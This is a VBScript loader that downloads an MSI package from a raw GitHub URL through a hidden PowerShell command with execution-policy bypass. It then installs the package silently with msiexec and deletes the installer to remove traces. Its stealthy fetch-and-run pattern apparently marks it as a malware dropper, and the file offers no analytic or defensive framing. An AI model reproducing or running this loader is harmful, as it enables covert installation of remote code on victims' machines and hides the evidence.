' ================== CONFIG ==================
PACKAGE_URL, TEMP_PATH, TEMP_DIR

PACKAGE_URL = "https://raw.githubusercontent.com/lordbacklink/Screen-01/refs/heads/main/1.msi"

TEMP_DIR  = "C:\Temp"
TEMP_PATH = TEMP_DIR & "\sc.msi"

' ================== OBJECTS ==================
Dim objShell, objFSO, intReturn
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

' ================== CREATE TEMP DIR ==================
If Not objFSO.FolderExists(TEMP_DIR) Then
    objFSO.CreateFolder TEMP_DIR
End If

' ================== CLEAN OLD FILES ==================
Dim oldFiles, f
oldFiles = Array(TEMP_DIR & "\sc.msi", TEMP_DIR & "\patch.msi")

For Each f In oldFiles
    If objFSO.FileExists(f) Then
        objFSO.DeleteFile f, True
    End If
Next

' ================== DOWNLOAD MSI ==================
Dim downloadCmd
downloadCmd = _
    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
    "(New-Object Net.WebClient).DownloadFile('" & PACKAGE_URL & "','" & TEMP_PATH & "')"""

intReturn = objShell.Run(downloadCmd, 0, True)

If Not objFSO.FileExists(TEMP_PATH) Then
    WScript.Quit 1
End If

' ================== INSTALL MSI ==================
Dim installCmd
installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"

intReturn = objShell.Run(installCmd, 0, True)

' ================== CLEANUP ==================
If objFSO.FileExists(TEMP_PATH) Then
    objFSO.DeleteFile TEMP_PATH, True
End If
